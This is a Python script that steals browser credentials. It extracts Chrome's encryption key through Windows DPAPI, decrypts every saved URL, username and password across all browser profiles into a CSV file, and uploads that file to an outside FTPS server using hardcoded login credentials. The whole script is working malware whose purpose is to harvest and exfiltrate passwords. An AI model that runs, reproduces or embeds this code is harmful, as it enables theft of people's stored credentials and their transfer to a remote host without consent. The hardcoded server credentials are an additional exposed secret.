import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
from ftplib import FTP_TLS  # Import FTP_TLS instead of FTP

# Global Constants
CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secret key cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()
        return decrypted_pass
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def upload_to_ftps(filename, ftps_server, ftps_username, ftps_password):
    try:
        ftps = FTP_TLS(ftps_server)  # Use FTP_TLS for secure connection
        ftps.login(ftps_username, ftps_password)
        ftps.prot_p()  # Switch to secure data connection
        with open(filename, 'rb') as file:
            ftps.storbinary(f'STOR {filename}', file)
        ftps.quit()
        print(f'Successfully uploaded {filename} to FTPS.')
    except Exception as e:
        print(f'Failed to upload {filename} to FTPS. Error: {e}')

if __name__ == '__main__':
    try:
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
            csv_writer.writerow(["index", "url", "username", "password"])
            secret_key = get_secret_key()
            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) != None]
            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
                if(secret_key and conn):
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, login in enumerate(cursor.fetchall()):
                        url, username, ciphertext = login
                        if(url and username and ciphertext):
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            csv_writer.writerow([index, url, username, decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
        # Upload to FTPS
        ftps_server = 'us-east-1.sftpcloud.io'  # Replace with your FTPS server
        ftps_username = '86cb675c25c04e65a4e653a6f618152d'  # Replace with your FTPS username
        ftps_password = 'uaaAKNB3CNvaSWfcnu2CVAwRCFTACJPR'  # Replace with your FTPS password
        upload_to_ftps('decrypted_password.csv', ftps_server, ftps_username, ftps_password)
    except Exception as e:
        print("[ERR] %s" % str(e))
